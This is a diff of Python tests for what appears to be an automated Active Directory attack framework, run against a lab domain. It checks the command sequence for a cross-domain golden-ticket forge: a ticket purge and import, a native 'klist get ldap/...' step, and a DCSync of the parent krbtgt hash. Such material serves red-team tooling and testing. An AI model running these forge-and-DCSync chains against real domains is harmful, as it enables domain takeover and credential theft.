@@ -4060,8 +4060,8 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     )))
 
     assert plan["ok"] is True
-    # Cross-domain (child->parent) forge: import the forged child TGT into the current session and let Windows
-    # acquire the parent referral/service ticket during the parent DCSync proof.
+    # Cross-domain (child->parent) forge: import the forged child TGT into the current session and ask Windows
+    # to acquire the parent LDAP ticket before the parent DCSync proof.
     assert [item["command"] for item in plan["commands"]] == [
         "shell",
         "shell",
@@ -4069,6 +4069,7 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
         "ticket_cache_purge",
         "ticket_cache_add",
         "ticket_cache_list",
+        "shell",
         "dcsync",
     ]
     assert plan["commands"][0]["produces"] == ["kerberos_context_inventory"]
@@ -4085,7 +4086,7 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     assert command["produces"] == ["kerberos_ticket_base64"]
     assert "asktgs" not in json.dumps(plan["commands"])
     assert plan["commands"][3]["parameters"] == {"all": True, "serviceName": "", "luid": ""}
-    # Import the child TGT into the current Kerberos context; the OS acquires the parent tickets on demand.
+    # Import the child TGT into the current Kerberos context before asking the OS for the parent LDAP ticket.
     assert plan["commands"][4]["command"] == "ticket_cache_add"
     assert plan["commands"][4]["deferred"] is True
     assert "kerberos_ticket_base64" in plan["commands"][4]["consumes"]
@@ -4093,8 +4094,10 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     assert plan["commands"][4]["parameters"] == {"base64ticket": "{{kerberos_ticket_base64}}"}
     assert plan["commands"][5]["command"] == "ticket_cache_list"
     assert plan["commands"][5]["parameters"] == {"luid": "", "getSystemTickets": False}
+    assert plan["commands"][6]["command"] == "shell"
+    assert plan["commands"][6]["parameters"] == "klist.exe get ldap/kingslanding.sevenkingdoms.local"
     # Parent-DCSync proof: replicate the parent krbtgt from the parent DC (user qualified at issue time).
-    dcsync = plan["commands"][6]
+    dcsync = plan["commands"][7]
     assert dcsync["command"] == "dcsync"
     assert dcsync["parameters"]["domain"] == "sevenkingdoms.local"
     assert dcsync["parameters"]["user"] == "SEVENKINGDOMS\\krbtgt"
@@ -4248,13 +4251,16 @@ def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     assert plan["execution_plan"]["steps"][2]["parameters"]["extra_sids"] == ["S-1-5-21-444-555-666-519"]
     assert "service" not in plan["execution_plan"]["steps"][1]["parameters"]
     # Cross-domain proof is a parent-krbtgt DCSync from the parent DC, not a CIFS service-access probe.
-    # The default path imports the child TGT and leaves referral/service acquisition to Windows.
+    # The default path imports the child TGT and asks Windows for the parent LDAP ticket before DCSync.
     import_step = plan["execution_plan"]["steps"][4]
     assert import_step["operation"] == "kerberos-ticket-import"
     assert import_step["parameters"]["domain"] == "north.sevenkingdoms.local"
     assert "kerberos-inter-realm-referral" not in {
         step["operation"] for step in plan["execution_plan"]["steps"]
     }
+    acquire_step = plan["execution_plan"]["steps"][-2]
+    assert acquire_step["operation"] == "kerberos-service-ticket-acquire"
+    assert acquire_step["parameters"]["service"] == "ldap/kingslanding.sevenkingdoms.local"
     dcsync_step = plan["execution_plan"]["steps"][-1]
     assert dcsync_step["operation"] == "drsuapi-dcsync"
     assert dcsync_step["parameters"]["domain"] == "sevenkingdoms.local"
@@ -4267,8 +4273,8 @@ def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tg
     # heuristic is position-agnostic and ALSO matches the cross-domain chain's core post-forge steps (current
     # TGT import, purge, post-import inventory), because their purposes mention the "current Kerberos context"
     # and the post-import list re-inventories it. Skipping the import collapses the cross-domain chain because
-    # Windows never gets the EA-capable TGT that allows native referral acquisition. Drive the REAL classifier +
-    # skip predicate over the REAL build payload to lock the position-aware behavior in.
+    # Windows never gets the EA-capable TGT that allows native LDAP-ticket acquisition. Drive the REAL classifier
+    # + skip predicate over the REAL build payload to lock the position-aware behavior in.
     mt = _make_tools()
 
     async def fake_fetch_credentials(now):
@@ -4301,10 +4307,12 @@ def test_cross_domain_forge_executor_skips_only_leading_preflight_not_current_tg
 
     # Leading inventory + access-check are skipped (redundant with the separate preflight)…
     assert issued[0] == "execute_assembly"  # golden forge, not the leading klist/dir
-    # …but every core step after the forge runs — critically the current-session TGT import and DCSync.
+    # …but every core step after the forge runs — critically the current-session TGT import, native LDAP-ticket
+    # acquisition, and DCSync.
     assert "ticket_cache_add" in issued, f"current-session TGT import was dropped: {issued}"
     assert "dcsync" in issued, f"parent DCSync was dropped: {issued}"
-    assert issued.count("execute_assembly") == 1  # golden only; Windows acquires referral/service tickets
+    assert issued.count("execute_assembly") == 1  # golden only; no Rubeus asktgs exchange
+    assert issued[-2] == "shell"  # native klist get ldap/<parent dc>
     assert issued[-1] == "dcsync"
 
 
@@ -4355,6 +4363,7 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
         "Ticket cache purged.",
         "Ticket successfully imported.",
         "Cached Tickets: (1)",
+        "Cached Tickets: (2)",
         "[DC] 'root.local'\nHash NTLM: 0123456789abcdef0123456789abcdef",
     ])
     calls = {}
@@ -4368,9 +4377,11 @@ def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
         "ticket_cache_purge",
         "ticket_cache_add",
         "ticket_cache_list",
+        "shell",
         "dcsync",
     ]
     assert forged_ticket in calls["issued"][2]["parameters"]["base64ticket"]
+    assert calls["issued"][4]["parameters"] == "klist.exe get ldap/dc01.root.local"
     assert calls["issued"][-1]["parameters"] == {
         "domain": "root.local",
         "user": "ROOT\\krbtgt",
@@ -4492,9 +4503,9 @@ def test_direct_dcsync_capabilities_verify_only_final_secret_probe(capability_na
 def test_cross_domain_current_tgt_import_grants_rights_and_precheck_honors_it(monkeypatch):
     # The DCSync rights precheck blocks a premature DCSync (no replication rights, graph populated). The
     # cross-domain forge's proof DCSync was blocked the same way — even though the imported EA-capable child TGT
-    # confers the right and lets Windows obtain the parent referral on demand — so the wall never crossed. After
-    # the forge imports that context, the parent right is granted and the precheck must let the proof DCSync
-    # through. Drive the REAL _engagement_issue_hook seam.
+    # confers the right and lets Windows obtain the parent LDAP ticket — so the wall never crossed. After the
+    # forge imports that context, the parent right is granted and the precheck must let the proof DCSync through.
+    # Drive the REAL _engagement_issue_hook seam.
     mt = _make_tools()
     mt.client = object()
 
